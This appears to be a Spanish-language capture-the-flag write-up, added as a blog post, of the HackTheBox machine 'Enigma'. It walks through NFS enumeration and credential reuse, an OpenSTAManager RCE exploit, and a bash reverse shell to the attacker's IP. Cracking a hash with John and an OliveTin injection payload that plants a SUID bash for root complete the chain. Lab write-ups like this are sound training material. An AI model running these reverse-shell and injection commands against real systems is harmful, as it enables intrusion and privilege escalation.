@@ -1,0 +1,231 @@
+---
+title: "Writeup Enigma"
+description: "Writeup de la máquina Enigma de HackTheBox"
+date: "2026-07-29"
+tags: ["HackTheBox", "hacking", "fuzzing", "htb", "enigma", "writeup", "john"]
+---
+
+## ¿Qué encontrarás aquí?
+
+- NFS
+- Olivetin
+- Roundcube
+- OpenSTAManager
+- Crackearemos un hash con John
+- Inyección de comandos
+- SUID
+
+## Tecnologías
+
+- Nmap
+- John The Ripper
+- Wfuzz
+
+# Escaneo de puertos
+
+Una vez tenemos la ip de la máquina procedemos a el escaneo de puertos y servicios.
+`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.129.239.191 -oN enigma.txt` 
+
+Observamos que tenemos varios puertos abiertos y sus servicios:
+
+* 80:http
+* 22:ssh 
+* 110:pop3 (Dovecot)
+* 111:rpc
+* 143:imap
+* 993:imap (Dovecot)
+* 2049:nfs
+
+[![escaneo_enigma](/escaneo_enigma.png)](/escaneo_enigma.png)
+
+## Comenzamos a enumerar
+
+Lo primero es visitar la web con la ip que ya tenemos y por el puerto 80 que sabemos sirve http, al hacerlo, nos muestra un dominio que tendremos que añadir a nuestro `/etc/hosts` .
+
+En este caso es `enigma.htb`.
+
+[![enigma_etc](/enigma_etc.png)](/enigma_etc.png)
+
+Una vez investigada la web, no eoncuentro nada relevante, así que hago fuzzing con Gobuster y Ffuzz pero no encuentro subdirectorios, así que probaré wfuzz para intentar descubrir subdominios.
+
+## fuzzing
+
+` wfuzz -c --hc=403,302 -t 20 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.enigma.htb" http://enigma.htb`
+
+Encuentro otro subdominio: `mail001.enigma.htb`
+
+[![enigma_wfuzz](/enigma_wfuzz.png)](/enigma_wfuzz.png)
+
+Lo añado a nuestro `/etc/hosts` y lo visito. Nos econtramos con un panel de login de Roundcube.
+
+[![enigma_roundcube](/enigma_roundcube.png)](/enigma_roundcube.png)
+
+Bien, he llegado hasta aquí y ahora toca estudiar la intrusión y como he visto en el escaneo que NFS está activo, voy a probar a montar una ubicación dentro de uno de los escenarios ya levantados, para ello usamos ` showmount -e 10.129.239.191` y veremos toda la lista.
+
+[![enigma_srv](/enigma_srv.png)](/enigma_srv.png)
+
+Así que usaremos `srv` paara montar nuestra ubicación.
+```
+sudo mkdir /mnt/enigma_nfs
+sudo mount -t nfs 10.129.37.187:/srv/nfs/onboarding /mnt/enigma_nfs -o nolock
+ls -la /mnt/enigma_nfs
+```
+Una vez  hecho esto, veo que hay un pdf, así que le hecho un vistazo y veo credenciales del usuario kevin que extraemos con `pdftotext`.
+
+`pdftotext /mnt/enigma_nfs/New_Employee_Access.pdf -`
+
+[![enigma_kevin](/enigma_kevin.png)](/enigma_kevin.png)
+
+Así que me logeo en Roundcube como Kevin y veo un email de Sarah que no me dice nada relevante, siendo así la parte más dificil de la máquina ya que no nos da ninguna pista para seguir, lo único que se me ocurre es probar la misma contraseña con Sarah y veo que logro logearme.
+
+En el email que hay en su bandeja veo otro subdominio y una contraseña para acceder. Así que lo hago aunque antes lo añado a mi `/etc/hosts`, `http://support_001.enigma.htb`.
+
+[![enigma_sarah](/enigma_sarah.png)](/enigma_sarah.png)
+
+Veo que las credenciales son: admin:Ne3s4rtars78s y me encuentro ante una instancia de OpenSTAManager que es un gestor de tareas para empresas.
+
+[![enigma_gestor](/enigma_gestor.png)](/enigma_gestor.png)
+
+Después de investigar un poco por internet, me doy cuenta que este gestor tiene varias vulnerabilidades, entre ellas un RCE CVE-2025-69212 y que accediendo a su archivo de configuración podría leer algo interesante. Así que voy a hacerlo.
+
+Lo primero es clonar el exploit.
+
+`git clone https://github.com/alaeddine03/CVE-2025-69212-PoC.git`
+
+Y sigo las instrucciones del repositorio para lanzarlo. Es realmente fácil.
+
+Ponemos nuestro `nc` a escuchar en el puerto 4444 y lanzo el exploit así:
+
+` python3 cve-2025-69212_poc.py -u http://support_001.enigma.htb -U admin -P 'Ne3s4rtars78s' --shell` 
+
+Esto creará un archivo `shell.php` y me dará una url donde inyectar comandos, en concreto esta:
+
+`http://support_001.enigma.htb/files/shell.php?c=<command>` 
+
+Ejecutamos directamnte la revshell, que previamnete he creado con `Deepseek` :
+
+`curl "http://support_001.enigma.htb/files/shell.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.15.132/4444%200>%261'"`
+
+Y ya estamos dentro como www-data.
+
+[![enigma_revshell](/enigma_revshell.png)](/enigma_revshell.png)
+
+Ahora estabilizamos la TTY.
+
+```
+# 1. Desde tu shell actual, ejecuta:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# 2. Ahora tu prompt debería cambiar a algo como "usuario@maquina:~$"
+# 3. Presiona Ctrl+Z para suspender la shell y volver a tu máquina local
+# 4. En tu máquina local, ejecuta:
+stty raw -echo; fg
+# 5. Presiona Enter dos veces
+# 6. Ahora deberías tener una shell completamente interactiva
+```
+
+Una vez dentro, intento leer el archivo de configuración de OpenSTAManager.
+
+`cat /var/www/html/openstamanager/config.inc.php | grep -E "db_username|db_password"`
+
+Y consigo leer datos relevantes de la db.
+
+[![enigma_config](/enigma_config.png)](/enigma_config.png)
+
+Una vez tenemos las nuevas credenciales, nos conectamos a la base de datos:
+
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+
+`mysql -u brollin -pFri3nds@9099 -D openstamanager` y una vez conectado extraigo los usuarios y las passwords con `SELECT id, username, password FROM zz_users;` .
+
+Veo otro usuario nuevo, haris, pero su contraseña esta hasheada, así que voy a usar John para intentar sacarla.
+
+[![enigma_hash](/enigma_hash.png)](/enigma_hash.png)
+
+Guardamos el hash de haris en un archivo llamado haris_hash.txt y se lo pasamos a john.
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt hash_haris.txt` 
+
+Y veo que la nueva contraseña es: bestfriends.
+
+[![enigma_best](/enigma_best.png)](/enigma_best.png)
+
+Ahora me logeo como haris: `su haris` utilizando la contraseña del hash.
+
+Busco la flag de usuario y la encuentro en '/haris`.
+
+[![enigma_flag](/enigma_flag.png)](/enigma_flag.png)
+
+## Escalada de privilegios
+
+Después de una investigación en profundidad, llego a la conclusión de que la vía más recomendada es escalar por medio de la explotación de Olivetin, que tiene una vulenrabilidad que me permite inyectar comandos por que la falla está en la función checkShellArgumentSafety. Su trabajo es bloquear tipos de argumentos peligrosos (como url o email) para evitar inyecciones de comandos.
+
+El problema es que el tipo password no está en esa lista negra. Esto hace que OliveTin trate el valor de una contraseña como texto seguro, sin sanitizarlo, y lo pase directamente a la shell.
+
+Empiezo enumerando Olivetin haciendo una enumeración y sé que corre en el puerto 1337, así que lo compruebo y veo que corre en localhost.
+
+`netstat -tulpn | grep 1337` 
+
+[![enigma_listen](/enigma_listen.png)](/enigma_listen.png)
+
+Ahora creo el payload de inyección:
+
+````
+cat > /tmp/payload.json <<'EOF'
+{
+  "bindingId": "backup_database",
+  "arguments": [
+    {"name": "db_user", "value": "backup_svc"},
+    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
+    {"name": "db_name", "value": "production"}
+  ]
+}
+EOF
+````
+Y lo ejecuto.
+
+````
+curl -s -X POST http://127.0.0.1:1337/api/StartAction \
+  -H 'Content-Type: application/json' \
+  --data @/tmp/payload.json
+  ````
+Veo una respuesta exitosa.
+
+[![enigma_exit](/enigma_exit.png)](/enigma_exit.png)
+
+Ahora verifico el binario SUID con: `ls -la /tmp/.bs` y lo ejecuto con: `/tmp/.bs -p` y ya somos root.
+
+[![enigma_root](/enigma_root.png)](/enigma_root.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
